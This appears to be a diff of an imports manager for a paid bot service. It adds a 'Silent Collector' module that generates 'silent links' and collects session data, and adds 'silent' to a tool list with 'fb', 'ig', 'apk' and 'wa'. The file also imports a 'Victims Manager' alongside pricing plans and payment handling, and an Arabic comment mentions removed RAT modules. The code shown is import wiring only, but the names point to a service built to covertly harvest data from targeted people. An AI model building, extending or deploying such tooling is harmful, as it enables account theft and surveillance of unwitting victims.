@@ -1,7 +1,7 @@
 # imports_manager.py
 # ============================================================
 # استيراد كل الأدوات مع Fallback آمن
-# v7 — بعد حذف RAT / QR / LSH / SH
+# v8 — مع Silent Collector
 # ============================================================
 
 import io
@@ -115,6 +115,35 @@ except Exception as e:
 
 
 # ============================================================
+# ★★★ Silent Collector
+# ============================================================
+try:
+    from silent_collector import (
+        init_silent_collector_routes,
+        generate_silent_link,
+        get_silent_data,
+        get_user_silent_sessions,
+    )
+    SILENT_ENABLED = True
+    logger.info("[+] silent_collector imported")
+except Exception as e:
+    logger.exception(f"silent_collector: {e}")
+    SILENT_ENABLED = False
+
+    def init_silent_collector_routes(app, bot):
+        pass
+
+    def generate_silent_link(*a, **kw):
+        return None
+
+    def get_silent_data(*a, **kw):
+        return None
+
+    def get_user_silent_sessions(*a, **kw):
+        return []
+
+
+# ============================================================
 # Victims Manager
 # ============================================================
 try:
@@ -225,7 +254,7 @@ except Exception as e:
 
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 3
-    AVAILABLE_TOOLS = ["fb", "ig", "apk", "wa"]
+    AVAILABLE_TOOLS = ["fb", "ig", "apk", "wa", "silent"]
 
     def is_admin(uid):
         return False
@@ -278,8 +307,9 @@ except Exception as e:
 # ============================================================
 logger.info(
     f"Imports Summary | "
+    f"SILENT={SILENT_ENABLED} | "
     f"WA={WA_ENABLED} | "
     f"APK_MGR={APK_MANAGER_ENABLED} | "
     f"VICTIMS={VICTIMS_ENABLED} | "
     f"PAYMENT={PAYMENT_ENABLED}"
-)
+    )
